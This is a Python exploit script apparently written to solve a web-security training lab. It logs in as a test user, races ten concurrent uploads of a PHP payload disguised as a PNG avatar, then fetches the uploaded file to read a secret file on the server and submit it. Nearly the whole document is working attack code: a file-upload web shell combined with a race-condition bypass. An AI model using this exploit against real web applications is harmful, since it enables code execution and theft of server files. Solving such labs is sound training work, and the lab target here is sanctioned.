import requests
import threading
from bs4 import BeautifulSoup

def upload(s, url, data):
    payload = r"<?php echo file_get_contents('/home/carlos/secret'); ?>"
    file_name = 'exploit.php'
    files = {'avatar': (file_name, payload, "image/png")}
    s.post(f"{url}/my-account/avatar", data=data, files=files)

def main():
  proxies = {
      'http': '127.0.0.1:8080',
      'https': '127.0.0.1:8080'
  }

  s = requests.Session()
  s.proxies.update(proxies)
  s.verify = False
  url = "https://0a6700e103d181b58065e41300dc00ce.web-security-academy.net"

  # login
  r = s.get(f"{url}/login")
  soup = BeautifulSoup(r.text)
  csrf = soup.find('input', {'name':'csrf'})['value']

  payload = {
    'csrf':csrf,
    'username':'wiener',
    'password':'peter'
  }

  r = s.post(f"{url}/login", data=payload)

  # upload exploit
  soup = BeautifulSoup(r.text)
  csrf = soup.find('input', {'name':'csrf'})['value']

  data = {
    'user':'wiener',
    'csrf':csrf
  }

  # multi thread upload
  threads = list()
  for i in range(10):
    x = threading.Thread(target=upload, args=(s,url,data))
    x.start()
  
  
  for i in range(10):
    r = s.get(f"{url}/files/avatars/exploit.php")
    if r.status_code == 200:
      secret = r.text
      # get secret and submit
      s.post(f"{url}/submitSolution", data={'answer':secret})
      break

if __name__ == "__main__":
  main()